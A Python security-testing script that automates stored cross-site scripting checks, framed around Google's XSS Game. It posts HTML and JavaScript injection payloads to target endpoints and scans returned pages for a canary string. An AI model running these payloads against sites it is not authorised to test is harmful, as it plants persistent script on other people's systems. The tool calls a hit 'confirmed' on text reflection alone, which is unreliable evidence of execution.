#!/usr/bin/env python3
"""
XSS ReflexionX v1.0.0 — Stored XSS Chain Verification
Handles POST → store → GET → verify execution chains.

Level 2 of Google XSS Game (Persistence is key) requires:
  1. POST payload to the status/storage endpoint
  2. GET the page that renders stored content
  3. Confirm payload execution in browser

Usage:
    python3 stored_xss_chain.py --post-data post_targets.txt --verify-urls verify_pages.txt \\
        --output-dir output/ --cookie "session=..."
"""

import argparse, json, os, re, sys
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote as url_quote
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

try:
    from payload_engine import PayloadEngine
    HAS_ENGINE = True
except ImportError:
    HAS_ENGINE = False

try:
    from xss_validator import CANARY_PREFIX, generate_canary
    HAS_VALIDATOR = True
except ImportError:
    HAS_VALIDATOR = False

CANARY_DEFAULT = "HF5XSSCONFIRMED"
TIMEOUT = 15


def generate_canary_local(url, param):
    if HAS_VALIDATOR:
        return generate_canary(url, param)
    import hashlib, time
    h = hashlib.md5(f"{url}:{param}:{time.time()}".encode()).hexdigest()[:8]
    return f"{CANARY_PREFIX}{h}"


def load_post_data(filepath):
    """Load POST target entries from file.
    Format per line:  URL<TAB>data<TAB>content_type
    Example:   http://target.com/status   status=<PAYLOAD_PLACEHOLDER>   application/x-www-form-urlencoded
    Or JSON array format.
    """
    entries = []
    if not os.path.isfile(filepath):
        print(f"[!] post-data file not found: {filepath}", file=sys.stderr)
        return entries
    with open(filepath) as f:
        content = f.read().strip()
    if content.startswith('['):
        try:
            entries = json.loads(content)
            return entries
        except json.JSONDecodeError:
            pass
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 3:
            entries.append({
                "url": parts[0].strip(),
                "data": parts[1].strip(),
                "content_type": parts[2].strip(),
            })
        elif len(parts) == 2:
            entries.append({
                "url": parts[0].strip(),
                "data": parts[1].strip(),
                "content_type": "application/x-www-form-urlencoded",
            })
        elif len(parts) == 1:
            entries.append({
                "url": parts[0].strip(),
                "data": "",
                "content_type": "application/x-www-form-urlencoded",
            })
    return entries


def submit_post(url, data, content_type="application/x-www-form-urlencoded", headers=None, cookie=None):
    """POST data to a URL and return response body."""
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    hdrs["Content-Type"] = content_type
    if cookie:
        hdrs["Cookie"] = cookie
    if headers:
        hdrs.update(headers)
    try:
        if isinstance(data, str):
            data = data.encode("utf-8")
        req = Request(url, data=data, headers=hdrs, method="POST")
        resp = urlopen(req, timeout=TIMEOUT)
        return resp.status, resp.read().decode("utf-8", errors="replace")
    except HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return 0, str(e)


def get_page(url, headers=None, cookie=None):
    """GET a URL and return response body."""
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    if cookie:
        hdrs["Cookie"] = cookie
    if headers:
        hdrs.update(headers)
    try:
        req = Request(url, headers=hdrs, method="GET")
        resp = urlopen(req, timeout=TIMEOUT)
        return resp.status, resp.read().decode("utf-8", errors="replace")
    except HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return 0, str(e)


def check_canary_in_body(body, canary):
    """Check if canary appears in response body (raw or HTML-escaped)."""
    if canary in body:
        return True
    escaped = canary.replace("<", "&lt;").replace(">", "&gt;")
    if escaped in body:
        return True
    return False


def run_stored_chain(post_entries, verify_url, cookie=None, output_dir=None):
    """For each POST entry, submit payload, then GET verify_url, check for canary.

    Returns list of findings dicts.
    """
    findings = []
    if HAS_ENGINE:
        engine = PayloadEngine(canary=CANARY_DEFAULT)
        payloads = engine.generate(context="html_body")
    else:
        payloads = [
            f"<img src=x onerror=window._xss_confirmed='{CANARY_DEFAULT}'>",
            f"<svg onload=window._xss_confirmed='{CANARY_DEFAULT}'>",
            f"<details open ontoggle=window._xss_confirmed='{CANARY_DEFAULT}'>",
            f"<script>window._xss_confirmed='{CANARY_DEFAULT}'</script>",
        ]

    for entry in post_entries:
        post_url = entry["url"]
        raw_data = entry.get("data", "")
        content_type = entry.get("content_type", "application/x-www-form-urlencoded")

        for payload in payloads[:8]:
            canary = generate_canary_local(post_url, "status")
            payload_with_canary = payload.replace(CANARY_DEFAULT, canary)

            # Build POST body replacing placeholder or appending value
            if "<PAYLOAD_PLACEHOLDER>" in raw_data:
                post_body = raw_data.replace("<PAYLOAD_PLACEHOLDER>", payload_with_canary)
            elif raw_data:
                if "=" in raw_data:
                    post_body = raw_data + "&status=" + url_quote(payload_with_canary, safe="")
                else:
                    post_body = raw_data + "&status=" + url_quote(payload_with_canary, safe="")
            else:
                post_body = "status=" + url_quote(payload_with_canary, safe="")

            # Step 1: POST the payload
            post_status, post_resp = submit_post(post_url, post_body, content_type, cookie=cookie)

            # Step 2: GET the verification page
            if verify_url:
                v_status, v_body = get_page(verify_url, cookie=cookie)
            else:
                v_status, v_body = post_status, post_resp

            # Step 3: Check if canary appears in rendered output
            if check_canary_in_body(v_body, canary):
                findings.append({
                    "type": "stored_xss",
                    "post_url": post_url,
                    "verify_url": verify_url or post_url,
                    "canary": canary,
                    "payload": payload_with_canary,
                    "post_status": post_status,
                    "verify_status": v_status,
                    "confirmed": True,
                    "note": "Canary found in stored output page",
                })
                if output_dir:
                    _save_finding(output_dir, findings[-1])
                break  # Found, no need to try more payloads for this entry

    return findings


def _save_finding(output_dir, finding):
    os.makedirs(output_dir, exist_ok=True)
    fpath = os.path.join(output_dir, "stored_xss_findings.json")
    existing = []
    if os.path.isfile(fpath):
        try:
            with open(fpath) as f:
                existing = json.load(f)
        except Exception:
            pass
    existing.append(finding)
    with open(fpath, "w") as f:
        json.dump(existing, f, indent=2)

    try:
        import hashlib
        poc_dir = os.path.join(output_dir, "poc", "confirmed")
        os.makedirs(poc_dir, exist_ok=True)
        url_hash = hashlib.md5(finding.get("verify_url", finding.get("post_url", "")).encode()).hexdigest()
        poc_file = os.path.join(poc_dir, f"{url_hash}_stored.txt")
        with open(poc_file, "w") as f:
            f.write(f"URL: {finding.get('verify_url', finding.get('post_url', ''))}\n")
            f.write(f"[STORED XSS CONFIRMED]\n")
            f.write(f"Payload: {finding.get('payload', '')}\n")
            f.write(f"Post URL: {finding.get('post_url', '')}\n")

        poc_txt = os.path.join(output_dir, "poc", "poc.txt")
        with open(poc_txt, "a") as f:
            f.write(f"{finding.get('verify_url', finding.get('post_url', ''))}\n")
    except Exception:
        pass


def main():
    parser = argparse.ArgumentParser(description="ReflexionX v1.0.0 — Stored XSS Chain Verification")
    parser.add_argument("--post-data", default=None, help="POST targets file")
    parser.add_argument("--verify-urls", default=None, help="URLs to verify")
    parser.add_argument("--output-dir", default=".", help="Output directory for findings")
    parser.add_argument("--cookie", default=None, help="Session cookie")
    parser.add_argument("--verify-same-page", action="store_true",
                        help="If set, GET the same POST URL to check for stored content")
    parser.add_argument("--test", action="store_true")
    args = parser.parse_args()

    if args.test:
        print("[OK] Stored XSS chain module loaded (dry run)")
        return

    post_entries = load_post_data(args.post_data)
    if not post_entries:
        print("[!] No POST entries loaded. Exiting.", file=sys.stderr)
        sys.exit(1)

    verify_urls = []
    if args.verify_urls and os.path.isfile(args.verify_urls):
        with open(args.verify_urls) as f:
            verify_urls = [l.strip() for l in f if l.strip()]

    all_findings = []
    if verify_urls:
        for vurl in verify_urls:
            print(f"[*] Verifying stored XSS chain on: {vurl}")
            findings = run_stored_chain(post_entries, vurl, cookie=args.cookie,
                                        output_dir=args.output_dir)
            all_findings.extend(findings)
            print(f"    Found {len(findings)} stored XSS confirmations")
    if args.verify_same_page or not all_findings:
        print("[*] Checking POST→GET chain on same page...")
        for entry in post_entries:
            print(f"[*] POST→GET chain on same page: {entry['url']}")
            findings = run_stored_chain([entry], entry["url"], cookie=args.cookie,
                                        output_dir=args.output_dir)
            all_findings.extend(findings)
            print(f"    Found {len(findings)} stored XSS confirmations")

    print(f"\n[DONE] Total stored XSS confirmations: {len(all_findings)}")
    if all_findings:
        print("[!] STORED XSS FOUND — review stored_xss_findings.json")


if __name__ == "__main__":
    main()
